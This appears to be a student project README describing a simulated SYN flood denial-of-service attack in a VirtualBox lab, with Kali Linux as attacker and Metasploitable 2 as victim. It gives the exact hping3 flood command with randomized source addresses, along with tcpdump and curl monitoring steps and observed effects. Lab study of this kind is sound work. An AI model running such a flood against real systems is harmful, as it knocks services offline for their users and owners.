# DDOS-Attack

DoS attack simulation using Kali Linux, Metasploitable 2, and hping3 for academic penetration testing research.

---

# Project Overview

This project demonstrates a simulated Denial of Service (DoS) attack in a controlled lab environment using Kali Linux and Metasploitable 2.

The purpose of the project is to understand:

- How SYN flood attacks work
- The impact of DoS attacks on system resources
- Network traffic monitoring techniques
- Basic penetration testing methodologies

---

# Technologies Used

- Kali Linux
- Metasploitable 2
- hping3
- tcpdump
- curl
- VirtualBox

---

# Lab Environment

| Machine | Purpose |
|----------|----------|
| Kali Linux | Attacker Machine |
| Metasploitable 2 | Victim Machine |
| VirtualBox | Virtualization Platform |

---

# Attack Type

## SYN Flood Attack

A SYN flood attack is a type of DoS attack where an attacker sends a large number of TCP SYN requests without completing the TCP handshake.

This causes:

- Half-open connections
- Resource exhaustion
- Slow server responses
- Potential service downtime

---

# Commands Used

## Verify Connectivity

```bash
ping 192.168.56.102
```

## Launch SYN Flood

```bash
sudo hping3 -S --flood --rand-source -p 80 192.168.56.102
```

## Monitor Network Traffic

```bash
sudo tcpdump -i eth0 port 80
```

## Test HTTP Response

```bash
time curl -I http://192.168.56.102
```

```bash
time curl -I --max-time 10 http://192.168.56.102
```

---

# Monitoring Results

## Before Attack

- CPU idle approximately 92%
- Minimal network activity
- Fast HTTP response

## During Attack

- CPU usage increased significantly
- Large SYN packet flood detected
- HTTP response became slow
- Multiple half-open connections created

---

# Educational Purpose

This project was conducted strictly in a controlled lab environment for educational and research purposes only.

No unauthorized systems or public networks were targeted.

---

# Screenshots

Add screenshots here:

- Kali Linux attack terminal
- tcpdump monitoring
- CPU usage during attack
- HTTP response delay testing

---

# License

This project is for educational purposes only.
